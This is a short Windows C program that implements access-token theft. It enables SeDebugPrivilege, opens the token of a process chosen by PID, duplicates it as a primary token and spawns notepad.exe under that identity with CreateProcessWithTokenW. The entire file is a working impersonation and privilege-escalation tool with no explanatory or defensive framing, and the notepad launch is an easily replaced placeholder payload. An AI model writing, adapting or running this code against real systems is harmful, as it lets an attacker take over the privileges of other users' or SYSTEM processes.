#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "advapi32.lib")

// Function to print error messages
void PrintError(const char* msg)
{
    DWORD error = GetLastError();
    LPVOID errorMsg;
    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        error,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR) &errorMsg,
        0, NULL );

    printf("%s. Error %d: %s\n", msg, error, (char*)errorMsg);
    LocalFree(errorMsg);
}

HANDLE getToken(DWORD pid)
{
    HANDLE cToken = NULL;
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);

    if (hProcess == NULL)
    {
        PrintError("Failed to open process");
        return NULL;
    }

    BOOL res = OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &cToken);
    if(!res)
    {
        PrintError("Failed to open process token");
        CloseHandle(hProcess);
        return NULL;
    }

    CloseHandle(hProcess);
    return cToken;
}

void setPrivilege(LPCSTR privilege)
{
    HANDLE token;
    TOKEN_PRIVILEGES tp;
    BOOL res;

    res = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);
    if (!res)
    {
        PrintError("Failed to open process token for privilege adjustment");
        return;
    }

    LookupPrivilegeValue(NULL, privilege, &tp.Privileges[0].Luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    res = AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (!res || GetLastError() != ERROR_SUCCESS)
    {
        PrintError("Failed to adjust token privileges");
    }

    CloseHandle(token);
}

int main (int argc, char **argv)
{
    if (argc != 2)
    {
        printf("Usage: %s <pid>\n", argv[0]);
        return 1;
    }

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    BOOL res = TRUE;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);

    setPrivilege(SE_DEBUG_NAME);
    DWORD pid = atoi(argv[1]);
    HANDLE token = getToken(pid);
    if (token == NULL)
    {
        return 1;
    }

    HANDLE newToken = NULL;
    res = DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &newToken);
    if(!res)
    {
        PrintError("Failed to duplicate token");
        return 1;
    }

    res = CreateProcessWithTokenW(newToken, LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\notepad.exe", NULL, 0, NULL, NULL, &si, &pi);
    if(!res)
    {
        PrintError("Failed to create process with token");
        return 1;
    }

    CloseHandle(token);
    CloseHandle(newToken);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}